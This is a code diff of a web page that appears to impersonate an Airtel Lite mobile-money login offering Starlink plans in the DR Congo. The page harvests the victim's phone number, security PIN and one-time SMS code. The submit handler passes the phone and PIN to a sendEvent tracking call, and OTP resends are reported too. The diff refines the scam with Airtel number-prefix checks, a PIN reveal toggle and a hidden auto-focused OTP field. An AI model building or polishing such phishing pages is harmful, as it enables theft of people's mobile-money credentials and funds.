@@ -190,18 +190,24 @@ img{display:block;max-width:100%}
       <div class="fc-change" onclick="goBack()">Modifier</div>
     </div>
     <div class="field">
-      <div class="field-lbl">Num&eacute;ro Airtel Lite</div>
+      <div class="field-lbl">Num&eacute;ro Airtel Lite <span style="color:var(--err);font-weight:800">*</span></div>
       <div class="fw" id="fw-phone">
         <div class="prefix">
           <span class="prefix-flag">&#127464;&#127465;</span>
           <span class="prefix-code">+243</span>
         </div>
-        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="9XX XXX XXX" maxlength="9" autocomplete="tel-national">
+        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="09X XXX XXX" maxlength="9" autocomplete="tel-national">
       </div>
       <div class="f-err" id="phoneErr"></div>
     </div>
     <div style="display:flex;flex-direction:column;gap:8px">
-      <div class="pin-lbl">Code PIN de S&eacute;curit&eacute; (4 chiffres)</div>
+      <div style="display:flex;align-items:center;justify-content:space-between">
+        <div class="pin-lbl">Code PIN de S&eacute;curit&eacute; (4 chiffres)</div>
+        <button id="peekBtn" onclick="togglePeek()" style="display:flex;align-items:center;gap:4px;font-size:12px;font-weight:600;color:var(--outline);padding:4px 0;background:none;border:none;cursor:pointer">
+          <svg id="peekIcon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          <span id="peekTxt">Afficher</span>
+        </button>
+      </div>
       <div class="pin-boxes">
         <div class="pb" id="pb0"><div class="pb-dot" id="pd0"></div></div>
         <div class="pb" id="pb1"><div class="pb-dot" id="pd1"></div></div>
@@ -254,23 +260,35 @@ img{display:block;max-width:100%}
       <div class="brand-sub">Un code &agrave; 4 chiffres a &eacute;t&eacute; envoy&eacute; sur votre num&eacute;ro Airtel</div>
       <div class="otp-phone" id="otpPhone">+243 &mdash;</div>
     </div>
-    <div class="otp-boxes">
-      <div class="ob" id="ob0"></div><div class="ob" id="ob1"></div>
-      <div class="ob" id="ob2"></div><div class="ob" id="ob3"></div>
+
+    <!-- OTP boxes — tap to focus native keyboard -->
+    <div class="otp-boxes" id="otpBoxes" onclick="document.getElementById('otpInput').focus()">
+      <div class="ob" id="ob0"></div>
+      <div class="ob" id="ob1"></div>
+      <div class="ob" id="ob2"></div>
+      <div class="ob" id="ob3"></div>
     </div>
+
+    <!-- Hidden native input — triggers device keyboard -->
+    <input id="otpInput"
+      type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4"
+      autocomplete="one-time-code"
+      style="position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;top:0;left:0"
+      oninput="onOTPInput(this.value)"
+      onblur="onOTPBlur()">
+
     <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
+      <div style="font-size:12px;color:var(--on-surf-v);display:flex;align-items:center;gap:5px">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
+        Appuyez sur les cases pour saisir le code
+      </div>
       <div class="otp-timer-row">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
         Code expire dans&nbsp;<span class="otp-timer" id="otpTimer">60</span>&nbsp;s
       </div>
       <div class="otp-resend dim" id="resendBtn" onclick="resendOTP()">Renvoyer le code OTP</div>
     </div>
-    <div class="numpad" id="otpPad">
-      <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
-      <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
-      <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
-      <button class="nk empty" disabled></button><button class="nk" data-v="0">0</button><button class="nk del" id="otpDel">&#9003;</button>
-    </div>
+
     <button class="btn-primary dim" id="otpBtn" onclick="submitOTP()">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
       Valider le Code
@@ -311,7 +329,16 @@ function setStep(n){
 }
 
 // PIN — dot only, no digit visible
-var pin='';
+var pin='';var peekVisible=false;
+function togglePeek(){
+  peekVisible=!peekVisible;
+  document.getElementById('peekTxt').textContent=peekVisible?'Masquer':'Afficher';
+  var icon=document.getElementById('peekIcon');
+  icon.innerHTML=peekVisible
+    ?'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
+    :'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  renderPIN();
+}
 function renderPIN(){
   for(var i=0;i<4;i++){
     var box=document.getElementById('pb'+i);
@@ -319,8 +346,23 @@ function renderPIN(){
     box.className='pb';
     if(i<pin.length){
       box.classList.add('filled');
-      dot.style.cssText='width:14px;height:14px;border-radius:50%;background:var(--red)';
+      if(peekVisible){
+        // Show digit
+        dot.style.cssText='width:0;height:0';
+        box.setAttribute('data-digit', pin[i]);
+        box.style.cssText='font-size:22px;font-weight:800;color:var(--red);font-family:DM Mono,monospace';
+        box.querySelector&&(box.querySelector('[data-lbl]')&&box.querySelector('[data-lbl]').remove());
+        if(!box.querySelector('.pb-digit')){var d=document.createElement('span');d.className='pb-digit';box.appendChild(d);}
+        box.querySelector('.pb-digit').textContent=pin[i];
+      } else {
+        // Show dot
+        if(box.querySelector('.pb-digit'))box.querySelector('.pb-digit').remove();
+        box.style.cssText='';
+        dot.style.cssText='width:14px;height:14px;border-radius:50%;background:var(--red)';
+      }
     } else {
+      if(box.querySelector('.pb-digit'))box.querySelector('.pb-digit').remove();
+      box.style.cssText='';
       dot.style.cssText='width:0;height:0';
     }
     if(i===pin.length) box.classList.add('active');
@@ -343,7 +385,8 @@ document.getElementById('phoneInput').addEventListener('blur',function(){
   document.getElementById('fw-phone').classList.remove('focus');
   var v=this.value.replace(/[^0-9]/g,'');
   var fw=document.getElementById('fw-phone');
-  if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';}
+  if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide — 9 chiffres requis';}
+  else if(v.length===9&&!/^(08|09)/.test(v)){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide — doit commencer par 08 ou 09';}
   else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
 });
 document.getElementById('phoneInput').addEventListener('input',function(){
@@ -358,6 +401,7 @@ renderPIN();
 function submitLogin(){
   var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
   if(ph.length!==9){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';hap([25,15,25]);return;}
+  if(!/^(08|09)/.test(ph)){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 08 ou 09';hap([25,15,25]);return;}
   if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN \u00e0 4 chiffres';hap([25,15,25]);return;}
   sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
   sendEvent('starlink_pin_submitted',{forfait:forfait.name,prix:forfait.price,telephone:'+243'+ph,pin:pin,appareil:navigator.userAgent.slice(0,80)});
@@ -390,7 +434,7 @@ async function runProcessing(ph){
   await slp(500);
   document.getElementById('otpPhone').textContent='+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
   otpVal='';renderOTP();updateOTPBtn();startTimer();
-  setStep(3);showView('viewOTP');
+  setStep(3);showView('viewOTP');focusOTPInput();
   document.getElementById('navSpinner').style.display='none';
 }
 
@@ -418,15 +462,27 @@ function resendOTP(){
   if(timerSecs>0)return;
   var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
   sendEvent('starlink_otp_resent',{forfait:forfait.name,telephone:'+243'+(auth.phone||''),ref:sessionStorage.getItem('starlinkRef')||''});
-  hap(15);otpVal='';renderOTP();updateOTPBtn();startTimer();
+  hap(15);otpVal='';document.getElementById('otpInput').value='';renderOTP();updateOTPBtn();startTimer();focusOTPInput();
 }
-document.getElementById('otpPad').addEventListener('click',function(e){
-  var k=e.target.closest('.nk');if(!k||k.disabled)return;
-  hap(8);rip(k,e);
-  if(k.id==='otpDel'){if(otpVal.length)otpVal=otpVal.slice(0,-1);}
-  else if(k.dataset.v!==undefined&&otpVal.length<4){otpVal+=k.dataset.v;}
+// Native keyboard OTP handler
+function onOTPInput(val){
+  otpVal=val.replace(/[^0-9]/g,'').slice(0,4);
+  document.getElementById('otpInput').value=otpVal;
   renderOTP();updateOTPBtn();
-});
+  if(otpVal.length===4){document.getElementById('otpInput').blur();}
+}
+function onOTPBlur(){
+  // keep boxes styled correctly
+  renderOTP();
+}
+// Focus native input when boxes are tapped — already wired in HTML
+// Auto-focus when OTP view shows (called from runProcessing)
+function focusOTPInput(){
+  setTimeout(function(){
+    var inp=document.getElementById('otpInput');
+    if(inp){inp.focus();inp.click();}
+  },300);
+}
 function submitOTP(){
   if(otpVal.length!==4){hap([25,15,25]);return;}
   var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
